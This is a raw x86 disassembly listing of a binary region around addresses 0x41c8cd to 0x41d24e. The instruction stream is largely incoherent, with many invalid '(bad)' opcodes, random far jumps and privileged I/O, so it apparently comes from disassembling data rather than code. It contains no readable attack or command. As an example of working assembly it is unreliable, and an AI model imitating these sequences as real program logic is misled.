  41c8cd:	adc    DWORD PTR [edx],0x8791054a
  41c8d3:	lahf   
  41c8d4:	dec    eax
  41c8d5:	out    dx,al
  41c8d6:	loopne 0x41c86f
  41c8d8:	pop    ebp
  41c8d9:	loopne 0x41c8b4
  41c8db:	ss jbe 0x41c8dd
  41c8de:	ds push edx
  41c8e0:	ins    BYTE PTR es:[edi],dx
  41c8e1:	in     eax,dx
  41c8e2:	or     al,0xbc
  41c8e4:	out    0xe0,al
  41c8e6:	cmp    ah,BYTE PTR [ebp+edx*4+0x2d]
  41c8ea:	hlt    
  41c8eb:	push   es
  41c8ec:	inc    esi
  41c8ed:	and    ah,BYTE PTR [esi+0x66]
  41c8f0:	adc    BYTE PTR [edx-0x76],dl
  41c8f3:	fld    TBYTE PTR [ecx-0x12]
  41c8f6:	popf   
  41c8f7:	test   al,0xe7
  41c8f9:	(bad)  
  41c8fa:	mov    ecx,0x1a6fcaed
  41c8ff:	push   edi
  41c900:	mov    esp,0xb09f3c4a
  41c905:	aam    0x92
  41c907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c908:	xor    al,dh
  41c90a:	mov    edx,0xf30bf02a
  41c90f:	jns    0x41c96c
  41c911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c912:	pop    esp
  41c913:	aam    0x18
  41c915:	xchg   ebx,eax
  41c916:	jle    0x41c89a
  41c918:	sub    edi,eax
  41c91a:	xor    eax,0x4f92cb19
  41c91f:	add    DWORD PTR [ecx+0x34355cb3],edi
  41c925:	sbb    BYTE PTR ds:0x6460c03d,ah
  41c92b:	sub    bl,BYTE PTR [ebx-0x6fd105a0]
  41c931:	adc    BYTE PTR [edx+0x23],al
  41c934:	stc    
  41c935:	dec    ecx
  41c936:	xor    eax,0x92ea44e2
  41c93b:	mov    ebp,0xa8bc1874
  41c940:	leave  
  41c941:	retf   
  41c942:	xchg   DWORD PTR [edi+eax*2-0x15],edx
  41c946:	xchg   edx,eax
  41c947:	repnz xor esi,DWORD PTR [ebx+0x3f]
  41c94b:	retf   0x8346
  41c94e:	jge    0x41c997
  41c950:	pop    ecx
  41c951:	je     0x41c9ce
  41c953:	adc    eax,0x594bb850
  41c958:	inc    edi
  41c959:	fcom   st(5)
  41c95b:	(bad)  
  41c95c:	push   ss
  41c95d:	cmp    al,0xa3
  41c95f:	pop    ss
  41c960:	jne    0x41c934
  41c962:	cwde   
  41c963:	mov    dh,dh
  41c965:	call   0xf1f56c0f
  41c96a:	int3   
  41c96b:	add    al,0x23
  41c96d:	xor    al,0x68
  41c96f:	sbb    eax,0xff634e00
  41c974:	shl    BYTE PTR [ebx+0x75],1
  41c977:	shl    ebx,cl
  41c979:	scas   eax,DWORD PTR es:[edi]
  41c97a:	fisttp WORD PTR [edi]
  41c97c:	nop
  41c97d:	lahf   
  41c97e:	push   0x6931dce0
  41c983:	rcl    DWORD PTR [edi+esi*8+0x45],1
  41c987:	sbb    eax,0x56fa443e
  41c98c:	adc    ch,BYTE PTR [edi-0x4a959252]
  41c992:	out    0x63,eax
  41c994:	popa   
  41c995:	xor    esp,DWORD PTR [ebx]
  41c997:	fnsave [ecx-0x73a4337b]
  41c99d:	out    0xfb,al
  41c99f:	cmp    eax,0x26ebd56d
  41c9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9a5:	xchg   ebp,eax
  41c9a6:	lds    ebp,FWORD PTR [eax+0x6f]
  41c9a9:	fisttp DWORD PTR [edi+0x4981055]
  41c9af:	sti    
  41c9b0:	jecxz  0x41ca25
  41c9b2:	xchg   esi,eax
  41c9b3:	mov    esi,0xb
	...
  41ca14:	add    BYTE PTR [eax],al
  41ca16:	lock retf 0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0xba14b909
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    BYTE PTR [ebx+0x15],ah
  41ca30:	ins    BYTE PTR es:[edi],dx
  41ca31:	fnstcw WORD PTR [edi-0x2662930c]
  41ca37:	add    ebp,eax
  41ca39:	adc    DWORD PTR [eax],eax
  41ca3b:	and    eax,0x370481b6
  41ca40:	scas   al,BYTE PTR es:[edi]
  41ca41:	repnz inc eax
  41ca43:	push   edi
  41ca44:	mov    ebx,0xb392eef6
  41ca49:	dec    edx
  41ca4a:	push   0xdfd2dbe9
  41ca4f:	dec    esi
  41ca50:	mov    al,0xd9
  41ca52:	add    esi,DWORD PTR [edi]
  41ca54:	push   esi
  41ca55:	cdq    
  41ca56:	pop    esi
  41ca57:	addr16 fwait
  41ca59:	dec    esp
  41ca5a:	adc    ch,al
  41ca5c:	jmp    0x9dce:0x2429ba9e
  41ca63:	adc    ch,dh
  41ca65:	hlt    
  41ca66:	or     BYTE PTR [ecx+0x53d6ab41],cl
  41ca6c:	mov    cl,0x21
  41ca6e:	jbe    0x41ca1b
  41ca70:	pop    edx
  41ca71:	add    DWORD PTR [edx],0x5
  41ca74:	inc    edi
  41ca75:	xchg   esi,eax
  41ca76:	lods   al,BYTE PTR ds:[esi]
  41ca77:	ret    
  41ca78:	aaa    
  41ca79:	mov    ds:0xef8bc628,al
  41ca7e:	aam    0x71
  41ca80:	jo     0x41cab8
  41ca82:	jle    0x41ca9e
  41ca84:	rol    dh,0x10
  41ca87:	aaa    
  41ca88:	mov    eax,ds:0xa53f4b84
  41ca8d:	(bad)  
  41ca8e:	pop    esi
  41ca8f:	outs   dx,BYTE PTR ds:[esi]
  41ca90:	aad    0x17
  41ca92:	and    al,0x14
  41ca94:	es loopne 0x41ca8c
  41ca97:	pop    esi
  41ca98:	ret    
  41ca99:	xchg   edx,eax
  41ca9a:	ins    BYTE PTR es:[edi],dx
  41ca9b:	cmp    esi,DWORD PTR [esi+0x71ea4e61]
  41caa1:	fsubr  st,st(3)
  41caa3:	ror    BYTE PTR [edi-0x76ce97ac],cl
  41caa9:	or     eax,0x757af501
  41caae:	mov    ?,WORD PTR [ebx]
  41cab0:	jge    0x41ca4c
  41cab2:	sbb    ebp,eax
  41cab4:	add    al,0x79
  41cab6:	fst    DWORD PTR [eax-0xa]
  41cab9:	and    DWORD PTR [esi+eax*8-0x98bd8b],eax
  41cac0:	dec    eax
  41cac1:	iret   
  41cac2:	dec    ebx
  41cac3:	enter  0xaf37,0x41
  41cac7:	popa   
  41cac8:	inc    esi
  41cac9:	push   cs
  41caca:	fwait
  41cacb:	aam    0x12
  41cacd:	mov    BYTE PTR [eax-0x19],bl
  41cad0:	rcr    al,cl
  41cad2:	mov    eax,0xc3f8f8fd
  41cad7:	popf   
  41cad8:	pop    esi
  41cad9:	sbb    BYTE PTR [edi],bl
  41cadb:	cld    
  41cadc:	ins    BYTE PTR es:[edi],dx
  41cadd:	mov    edi,0xebee19c4
  41cae2:	push   edx
  41cae3:	loope  0x41caaf
  41cae5:	xchg   edi,eax
  41cae6:	(bad)  
  41cae7:	lds    ebp,FWORD PTR [ecx+0x69]
  41caea:	and    BYTE PTR [edi],0xe1
  41caed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caee:	mov    edx,0xac0fd9af
  41caf3:	cwde   
  41caf4:	cmp    ah,ah
  41caf6:	call   0x715500d5
  41cafb:	call   0x458c1566
  41cb00:	test   BYTE PTR [edi+0x4d],ah
  41cb03:	dec    edx
  41cb04:	push   ss
  41cb05:	int3   
  41cb06:	clc    
  41cb07:	and    eax,0xb80e21e9
  41cb0c:	xchg   esp,eax
  41cb0d:	mov    cl,0xb1
  41cb0f:	add    bl,bh
  41cb11:	(bad)  
  41cb12:	pop    es
  41cb13:	pop    ss
  41cb14:	or     DWORD PTR [ecx],esp
  41cb16:	jg     0x41cb8a
  41cb18:	call   0xb86109e6
  41cb1d:	fild   QWORD PTR [edx+edx*8]
  41cb20:	ret    0x3433
  41cb23:	test   DWORD PTR [ecx+0x4dbe028e],eax
  41cb29:	add    eax,0xf07f302a
  41cb2e:	adc    esi,0xa11c3c7e
  41cb34:	mov    ds:0x0,al
	...
  41cb95:	add    BYTE PTR [ecx],ch
  41cb97:	(bad)  
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi-0x3c3dc3b4]
  41cba3:	les    ecx,FWORD PTR [esi+eax*4+0x12f7f]
  41cbaa:	pop    es
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    cl,ah
  41cbaf:	cli    
  41cbb0:	not    BYTE PTR [edi+edi*4]
  41cbb3:	push   edx
  41cbb4:	pop    esp
  41cbb5:	call   0xef86d403
  41cbba:	xchg   ebp,eax
  41cbbb:	or     eax,0x73c0765c
  41cbc0:	(bad)  
  41cbc1:	and    ebp,DWORD PTR [ecx]
  41cbc3:	in     eax,dx
  41cbc4:	and    bl,ah
  41cbc6:	int    0x51
  41cbc8:	add    al,0x5f
  41cbca:	(bad)  
  41cbcb:	sbb    eax,DWORD PTR [esi]
  41cbcd:	and    edx,DWORD PTR [edi+0x38eacc4e]
  41cbd3:	adc    al,0xc9
  41cbd5:	sbb    al,0xe4
  41cbd7:	aas    
  41cbd8:	jmp    0x41cbf0
  41cbda:	(bad)  
  41cbdb:	sbb    DWORD PTR [eax+0x50],ebx
  41cbde:	xlat   BYTE PTR ds:[ebx]
  41cbdf:	dec    esi
  41cbe0:	imul   edx,esi,0x48
  41cbe3:	mov    dh,0x2d
  41cbe5:	stos   DWORD PTR es:[edi],eax
  41cbe6:	stc    
  41cbe7:	adc    BYTE PTR [eax],al
  41cbe9:	pop    ebx
  41cbea:	sbb    BYTE PTR [edx-0x79],ah
  41cbed:	ins    DWORD PTR es:[edi],dx
  41cbee:	lahf   
  41cbef:	xor    ebp,ecx
  41cbf1:	icebp  
  41cbf2:	adc    esi,edi
  41cbf4:	sbb    al,0x3c
  41cbf6:	add    BYTE PTR [edx],al
  41cbf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbf9:	ret    
  41cbfa:	mov    esi,0xf0c11c1
  41cbff:	pop    esp
  41cc00:	sub    eax,0x8b1d7f0e
  41cc05:	or     cl,BYTE PTR [eax]
  41cc07:	adc    al,0xe4
  41cc09:	bound  esp,QWORD PTR [ebp+0xe3fc858]
  41cc0f:	nop
  41cc10:	(bad)  
  41cc11:	ja     0x41cbef
  41cc13:	aam    0xd9
  41cc15:	mov    ds:0x780c61f8,al
  41cc1a:	mov    eax,0xc7734ca4
  41cc1f:	cmp    DWORD PTR [ecx+esi*2],esp
  41cc22:	or     ecx,ebp
  41cc24:	push   ds
  41cc25:	test   DWORD PTR [ebx+eax*1+0x46b7eb3a],0xaf3c962a
  41cc30:	aam    0xfc
  41cc32:	mov    al,0xcc
  41cc34:	sbb    eax,0x4bc126f
  41cc39:	aas    
  41cc3a:	inc    ebp
  41cc3b:	das    
  41cc3c:	jmp    0x3346:0xe21bbcd6
  41cc43:	neg    bh
  41cc45:	scas   al,BYTE PTR es:[edi]
  41cc46:	fadd   st,st(2)
  41cc48:	add    ecx,DWORD PTR [ebp+0x4c]
  41cc4b:	inc    ebp
  41cc4c:	bound  esp,QWORD PTR [esi]
  41cc4e:	pop    ss
  41cc4f:	jmp    0xd132:0xc09cb00a
  41cc56:	in     al,0x92
  41cc58:	mov    al,ds:0x9c8ea9a0
  41cc5d:	cmp    eax,0x165d6cee
  41cc62:	fs es loop 0x41cc88
  41cc66:	jl     0x41ccd9
  41cc68:	mov    ebx,0x7812ab61
  41cc6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc6e:	mov    dl,0x41
  41cc70:	mov    edi,0xaf1541e3
  41cc75:	js     0x41ccd5
  41cc77:	mov    cs,WORD PTR [ebx]
  41cc79:	cmp    esi,esp
  41cc7b:	vmread DWORD PTR [ecx+0x1],ecx
  41cc7f:	pop    ds
  41cc80:	call   0x9450:0x4ac242f9
  41cc87:	add    BYTE PTR [edi+0x68],dl
  41cc8a:	aaa    
  41cc8b:	lods   al,BYTE PTR ds:[esi]
  41cc8c:	pusha  
  41cc8d:	jae    0x41ccc0
  41cc8f:	in     eax,0x7b
  41cc91:	adc    eax,DWORD PTR [edi-0x68]
  41cc94:	loope  0x41cc95
  41cc96:	cmc    
  41cc97:	outs   dx,BYTE PTR ds:[esi]
  41cc98:	push   esp
  41cc99:	pop    ebp
  41cc9a:	inc    eax
  41cc9b:	repz iret 
  41cc9d:	push   esp
  41cc9e:	mov    ecx,0xb34ca867
  41cca3:	jns    0x41cc71
  41cca5:	and    eax,0x2c6e6205
  41ccaa:	sub    ch,bh
  41ccac:	(bad)  
  41ccad:	or     DWORD PTR [ecx+ebp*2+0x4c],esp
  41ccb1:	adc    eax,0xac963b
	...
  41cd16:	pusha  
  41cd17:	cdq    
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	retw   0x2d11
  41cd26:	xchg   BYTE PTR [eax],dh
  41cd28:	add    DWORD PTR [eax],eax
  41cd2a:	pop    es
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    BYTE PTR [ebx],bh
  41cd2f:	pushfw 
  41cd31:	pop    ds
  41cd32:	je     0x41cce5
  41cd34:	(bad)  
  41cd35:	mov    bl,0x5e
  41cd37:	push   fs
  41cd39:	cmp    BYTE PTR [ecx],ah
  41cd3b:	add    esi,edi
  41cd3d:	jmp    0xca3d:0x4ed23e0c
  41cd44:	enter  0x2cc0,0xa9
  41cd48:	xchg   ebp,eax
  41cd49:	dec    ecx
  41cd4a:	scas   al,BYTE PTR es:[edi]
  41cd4b:	hlt    
  41cd4c:	xchg   ebx,eax
  41cd4d:	mov    esi,0x7910f196
  41cd52:	loopne 0x41ccec
  41cd54:	add    al,0x14
  41cd56:	and    BYTE PTR [edx-0x2df396df],0x31
  41cd5d:	inc    ecx
  41cd5e:	push   0x51
  41cd60:	push   esp
  41cd61:	sbb    al,0x7b
  41cd63:	addr16 cmp eax,0xfb08256e
  41cd69:	push   0x7e99292c
  41cd6e:	sub    eax,esp
  41cd70:	push   0x78
  41cd72:	mov    esi,0x82c2b906
  41cd77:	add    al,0x48
  41cd79:	push   ds
  41cd7a:	add    dh,bh
  41cd7c:	fst    QWORD PTR [ebx]
  41cd7e:	xor    dl,BYTE PTR [ecx-0x77ed7e2a]
  41cd84:	(bad)  
  41cd85:	loope  0x41cd3b
  41cd87:	cld    
  41cd88:	pop    ebp
  41cd89:	xlat   BYTE PTR ds:[ebx]
  41cd8a:	stc    
  41cd8b:	and    dl,ch
  41cd8d:	push   ebp
  41cd8e:	iret   
  41cd8f:	inc    ebp
  41cd90:	or     BYTE PTR [ecx-0x1c],al
  41cd93:	cmc    
  41cd94:	test   DWORD PTR [edx+0x66],edx
  41cd97:	inc    esp
  41cd98:	push   ds
  41cd99:	lods   al,BYTE PTR ds:[esi]
  41cd9a:	das    
  41cd9b:	cmp    al,0x5
  41cd9d:	(bad)  
  41cd9e:	nop
  41cd9f:	add    eax,0xfbda2bd2
  41cda4:	dec    edx
  41cda5:	push   0xffffffdc
  41cda7:	mov    al,ds:0x8c562f49
  41cdac:	sbb    al,0x55
  41cdae:	fisttp QWORD PTR [ecx]
  41cdb0:	push   eax
  41cdb1:	or     al,0xdf
  41cdb3:	pop    ebp
  41cdb4:	pushf  
  41cdb5:	aam    0xb4
  41cdb7:	adc    BYTE PTR fs:[eax+eiz*2-0x42],cl
  41cdbc:	dec    edx
  41cdbd:	mov    ds:0x21e3648b,eax
  41cdc2:	iret   
  41cdc3:	call   0x91f1:0xf6f8d695
  41cdca:	shr    DWORD PTR [edi+0x1e3726ca],1
  41cdd0:	leave  
  41cdd1:	outs   dx,DWORD PTR ds:[esi]
  41cdd2:	mov    edi,0x38c30577
  41cdd7:	in     eax,dx
  41cdd8:	mov    dl,0xa3
  41cdda:	int    0xf5
  41cddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cddd:	mov    bh,0x16
  41cddf:	push   cs
  41cde0:	mov    cl,0xcd
  41cde2:	mov    edx,0xc535ee28
  41cde7:	sbb    BYTE PTR [edx+0x20ba8ef5],dh
  41cded:	add    BYTE PTR [esp+edi*1+0x50419409],dh
  41cdf4:	leave  
  41cdf5:	(bad)  
  41cdf6:	call   0x8e73f613
  41cdfb:	sar    ch,1
  41cdfd:	xor    ebx,0xffffffe1
  41ce00:	pop    eax
  41ce01:	jmp    0x41cd95
  41ce03:	scas   al,BYTE PTR es:[edi]
  41ce04:	add    dl,BYTE PTR [edx-0x61]
  41ce07:	jg     0x41ce33
  41ce09:	or     DWORD PTR [edi+0x2f8bc501],0x222cec65
  41ce13:	ss fs into 
  41ce16:	cli    
  41ce17:	fs xchg esp,eax
  41ce19:	mov    ds:0x3e87a584,eax
  41ce1e:	ja     0x41ce63
  41ce20:	dec    ebp
  41ce21:	sub    eax,0x1b743125
  41ce26:	in     eax,dx
  41ce27:	xor    bh,BYTE PTR es:[edx]
  41ce2a:	repz jle 0x41ce61
  41ce2d:	jmp    0x3ae49294
  41ce32:	and    esi,DWORD PTR [ecx]
  41ce34:	dec    ecx
	...
  41ce95:	add    BYTE PTR [edi],al
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0x4e30dc89
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    BYTE PTR [ebp-0x5dead8f9],ah
  41ceb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceb4:	icebp  
  41ceb5:	fcomp  DWORD PTR [edi]
  41ceb7:	retf   0xc89c
  41ceba:	mov    es,WORD PTR fs:0x1b562873
  41cec1:	out    0x83,eax
  41cec3:	xor    al,0x9e
  41cec5:	adc    BYTE PTR [edx],dh
  41cec7:	adc    BYTE PTR [esi],ah
  41cec9:	test   DWORD PTR [edi+ebx*4-0x57],esi
  41cecd:	mov    bl,0x7c
  41cecf:	cmp    eax,edi
  41ced1:	or     edx,edx
  41ced3:	js     0x41cefd
  41ced5:	iret   
  41ced6:	(bad)  
  41ced7:	mov    DWORD PTR ss:[edx+0x565a9f73],esi
  41cede:	jae    0x41ce86
  41cee0:	pop    edx
  41cee1:	leave  
  41cee2:	sub    ch,ah
  41cee4:	mov    edi,DWORD PTR [eax-0x65]
  41cee7:	add    BYTE PTR [edx-0x15],al
  41ceea:	jnp    0x41cf59
  41ceec:	test   ecx,ecx
  41ceee:	sbb    eax,0xdcb34fa
  41cef3:	sbb    dl,BYTE PTR [eax-0x4998d673]
  41cef9:	inc    ecx
  41cefa:	inc    ebx
  41cefb:	loope  0x41cf78
  41cefd:	into   
  41cefe:	jb     0x41cf5e
  41cf00:	xchg   ebp,eax
  41cf01:	lahf   
  41cf02:	mov    dl,0x37
  41cf04:	mov    ds:0x811f0784,al
  41cf09:	pop    eax
  41cf0a:	add    eax,0x65525b52
  41cf0f:	adc    al,0xd5
  41cf11:	mov    WORD PTR [ecx-0xb],?
  41cf14:	(bad)  
  41cf15:	sub    BYTE PTR [ebx+0x10],0x8c
  41cf19:	les    edx,FWORD PTR [edi+0x2e]
  41cf1c:	sbb    bh,BYTE PTR [eax+ecx*2-0xe934d62]
  41cf23:	push   edi
  41cf24:	mov    ch,0x9d
  41cf26:	in     eax,dx
  41cf27:	outs   dx,DWORD PTR ds:[esi]
  41cf28:	std    
  41cf29:	hlt    
  41cf2a:	pop    esp
  41cf2b:	add    DWORD PTR [eax],eax
  41cf2d:	js     0x41cf12
  41cf2f:	int    0x35
  41cf31:	pop    ebx
  41cf32:	push   ss
  41cf33:	stos   DWORD PTR es:[edi],eax
  41cf34:	call   0x344b94da
  41cf39:	jmp    DWORD PTR cs:[ebx-0x798b078b]
  41cf40:	aaa    
  41cf41:	and    dl,dh
  41cf43:	fadd   QWORD PTR [edx]
  41cf45:	rcr    BYTE PTR ds:0x29d9c89,0xee
  41cf4c:	jg     0x41ced8
  41cf4e:	xchg   ecx,eax
  41cf4f:	sbb    ah,BYTE PTR [eax]
  41cf51:	call   0xfb98:0x98db749f
  41cf58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf59:	cmc    
  41cf5a:	les    ebp,FWORD PTR [edx+0x7]
  41cf5d:	inc    edi
  41cf5e:	xchg   edx,eax
  41cf5f:	lea    ebp,[esi-0xb301eb9]
  41cf65:	fidiv  WORD PTR [ecx-0x70]
  41cf68:	or     al,0x87
  41cf6a:	mov    cl,0x4c
  41cf6c:	mov    cl,0xe1
  41cf6e:	dec    ebx
  41cf6f:	sub    ecx,DWORD PTR gs:[ebx]
  41cf72:	mov    ds:0xa42e1fa6,al
  41cf77:	jae    0x41cfc2
  41cf79:	xchg   ecx,eax
  41cf7a:	inc    esi
  41cf7b:	bound  ebx,QWORD PTR [edi]
  41cf7d:	ror    BYTE PTR [ecx+0x1cfee718],1
  41cf83:	fcomp  DWORD PTR [edx-0x390dd470]
  41cf89:	mov    esi,0xa6a87429
  41cf8e:	pop    esp
  41cf8f:	xchg   edx,eax
  41cf90:	mov    bh,0x75
  41cf92:	in     al,dx
  41cf93:	fcom   QWORD PTR [edx-0x7e65ff57]
  41cf99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf9a:	popa   
  41cf9b:	stos   BYTE PTR es:[edi],al
  41cf9c:	cmp    al,0xc8
  41cf9e:	push   0x5d62efab
  41cfa3:	mov    ah,0x6b
  41cfa5:	jge    0x41cf73
  41cfa7:	lds    ebp,FWORD PTR [ebp+0x61d8100]
  41cfad:	jmp    0x6e88db2a
  41cfb2:	mov    cs,esi
  41cfb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41d015:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	ja     0x41d05c
  41d024:	je     0x41d01f
  41d026:	xchg   esp,eax
  41d027:	xor    al,BYTE PTR [ecx]
  41d029:	add    BYTE PTR [edi],al
  41d02b:	add    DWORD PTR [eax],eax
  41d02d:	add    BYTE PTR [ebx+0x739f8288],al
  41d033:	adc    DWORD PTR [esp+eax*4],eax
  41d036:	fld1   
  41d038:	icebp  
  41d039:	into   
  41d03a:	stos   DWORD PTR es:[edi],eax
  41d03b:	test   BYTE PTR [edx-0x5d],dh
  41d03e:	dec    ecx
  41d03f:	jno    0x41d077
  41d041:	push   esi
  41d042:	pop    ds
  41d043:	call   0xf46d:0x6801ae87
  41d04a:	(bad)  
  41d04b:	jmp    0xea80c87c
  41d050:	rcr    BYTE PTR [eax+0x2cd06c8c],0x8a
  41d057:	ror    DWORD PTR [edi+0x77],1
  41d05a:	adc    esi,DWORD PTR [esi+0x4d4e8a19]
  41d060:	sbb    ch,BYTE PTR [eax+ecx*2+0x22]
  41d064:	rcl    cl,0x28
  41d067:	adc    BYTE PTR [esi+0x3c],dh
  41d06a:	xor    eax,0x536e2339
  41d06f:	retf   
  41d070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d071:	mov    ds:0x46c33c29,eax
  41d076:	fs mov edx,0x3e21bcb4
  41d07c:	test   DWORD PTR [edx],0x6e1d5b69
  41d082:	push   0x8ec27fd8
  41d087:	ficom  DWORD PTR [ebx]
  41d089:	xlat   BYTE PTR ds:[ebx]
  41d08a:	(bad)  
  41d08c:	push   cs
  41d08d:	or     DWORD PTR [ecx+0x46],0x3a1b58a8
  41d094:	test   DWORD PTR [edx],esp
  41d096:	pop    esp
  41d097:	cmp    ecx,eax
  41d099:	aaa    
  41d09a:	jecxz  0x41d114
  41d09c:	pop    edx
  41d09d:	fiadd  WORD PTR [esi+0x4f]
  41d0a0:	and    DWORD PTR [ebx-0x3b],ebx
  41d0a3:	jle    0x41d0b9
  41d0a5:	mov    bh,0x75
  41d0a7:	js     0x41d073
  41d0a9:	dec    ebx
  41d0aa:	aad    0x3f
  41d0ac:	xchg   cl,cl
  41d0ae:	in     eax,0x9c
  41d0b0:	stc    
  41d0b1:	xchg   esi,eax
  41d0b2:	jge    0x41d0ce
  41d0b4:	pushf  
  41d0b5:	push   cs
  41d0b6:	sbb    dl,BYTE PTR [eax-0x3985caae]
  41d0bc:	pop    fs
  41d0be:	fcmovnb st,st(4)
  41d0c0:	sbb    eax,0x70cee52b
  41d0c5:	fadd   DWORD PTR [ecx]
  41d0c7:	sahf   
  41d0c8:	mov    esi,0x2be55fac
  41d0cd:	mov    edi,0x22c880ad
  41d0d2:	pop    esi
  41d0d3:	pop    ebp
  41d0d4:	retf   0xeecd
  41d0d7:	pop    ss
  41d0d8:	inc    ecx
  41d0d9:	sub    bh,dl
  41d0db:	xchg   ebp,eax
  41d0dc:	sub    DWORD PTR [edx],ecx
  41d0de:	stc    
  41d0df:	loope  0x41d088
  41d0e1:	cmc    
  41d0e2:	xlat   BYTE PTR ds:[ebx]
  41d0e3:	iret   
  41d0e4:	neg    BYTE PTR [eax-0x2f]
  41d0e7:	dec    ecx
  41d0e8:	jnp    0x41d142
  41d0ea:	sar    DWORD PTR [edi+0x60a1f041],0x18
  41d0f1:	mov    ds:0x72d1b0a6,al
  41d0f6:	push   esp
  41d0f7:	mov    cs,WORD PTR [ecx-0x3b831fb3]
  41d0fd:	fcom   QWORD PTR [ebp-0x28cd6392]
  41d103:	out    0xf5,eax
  41d105:	js     0x41d0ab
  41d107:	mov    WORD PTR ds:0x46e22311,ds
  41d10d:	pop    es
  41d10e:	sbb    al,0x58
  41d110:	add    ch,BYTE PTR [edi+eiz*2-0x54af2d14]
  41d117:	in     eax,dx
  41d118:	dec    esi
  41d119:	loopne 0x41d150
  41d11b:	neg    DWORD PTR [edx]
  41d11d:	push   esi
  41d11e:	cli    
  41d11f:	imul   ebp,DWORD PTR [ebp+0x7ba8a18c],0x9a17218f
  41d129:	iret   
  41d12a:	ror    DWORD PTR [edi+edi*2],0xea
  41d12e:	xor    DWORD PTR [ebx],esp
  41d130:	scas   eax,DWORD PTR es:[edi]
  41d131:	push   esi
  41d132:	pop    ebx
  41d133:	mov    al,0x2
	...
  41d195:	add    BYTE PTR [eax-0x3d],dl
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d206
  41d1a3:	mov    ecx,0x339b168e
  41d1a8:	add    DWORD PTR [eax],eax
  41d1aa:	pop    es
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [edi+0x4f220d21],dl
  41d1b3:	jmp    0x41d206
  41d1b5:	pop    esp
  41d1b6:	push   0x7b
  41d1b8:	push   ebp
  41d1b9:	ret    
  41d1ba:	cld    
  41d1bb:	aas    
  41d1bc:	lock mov dl,0xeb
  41d1bf:	daa    
  41d1c0:	pop    ss
  41d1c1:	hlt    
  41d1c2:	(bad)  
  41d1c3:	jl     0x41d186
  41d1c5:	cmp    bl,BYTE PTR [ecx]
  41d1c7:	xchg   ebp,eax
  41d1c8:	call   0x7fa23ede
  41d1cd:	(bad)  
  41d1ce:	call   0x429a6f87
  41d1d3:	jge    0x41d182
  41d1d5:	mov    esp,0x60c4b08a
  41d1da:	shl    BYTE PTR [ecx],cl
  41d1dc:	popf   
  41d1dd:	or     eax,0x72802d89
  41d1e2:	es jmp 0xc64277d9
  41d1e8:	push   edx
  41d1e9:	push   ecx
  41d1ea:	jb     0x41d1e5
  41d1ec:	push   eax
  41d1ed:	not    ecx
  41d1ef:	in     eax,dx
  41d1f0:	push   eax
  41d1f1:	and    al,0x58
  41d1f3:	(bad)  
  41d1f4:	(bad)  
  41d1f6:	mov    cl,0xc1
  41d1f8:	shl    DWORD PTR [eax+0x51],0xfd
  41d1fc:	test   al,0xca
  41d1fe:	stc    
  41d1ff:	outs   dx,DWORD PTR ds:[esi]
  41d200:	int3   
  41d201:	aad    0x8
  41d203:	ret    0xd984
  41d206:	sub    esi,DWORD PTR [ecx+ebp*4-0x3a4c912]
  41d20d:	jg     0x41d1a9
  41d20f:	scas   eax,DWORD PTR es:[edi]
  41d210:	add    eax,0x5eeda72d
  41d215:	and    esp,DWORD PTR [edx-0x6f]
  41d218:	xor    ecx,DWORD PTR [eax]
  41d21a:	xor    esi,DWORD PTR ds:0x205a1284
  41d220:	ins    DWORD PTR es:[edi],dx
  41d221:	adc    BYTE PTR [eax+esi*8-0x7b70d03e],dh
  41d228:	lods   eax,DWORD PTR ds:[esi]
  41d229:	rcl    edx,0x73
  41d22c:	pop    ebp
  41d22d:	and    eax,0x93c99967
  41d232:	xchg   ebp,eax
  41d233:	arpl   si,dx
  41d235:	mov    ebx,0x3556fc71
  41d23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23b:	jg     0x41d281
  41d23d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d23e:	ins    BYTE PTR es:[edi],dx
  41d23f:	icebp  
  41d240:	ret    
  41d241:	outs   dx,BYTE PTR ds:[esi]
  41d242:	inc    DWORD PTR [ebp+0x29]
  41d245:	mov    cl,0x67
  41d247:	adc    DWORD PTR [edi+0x5b],0x9c28f145
  41d24e:	xor    al,0xd3
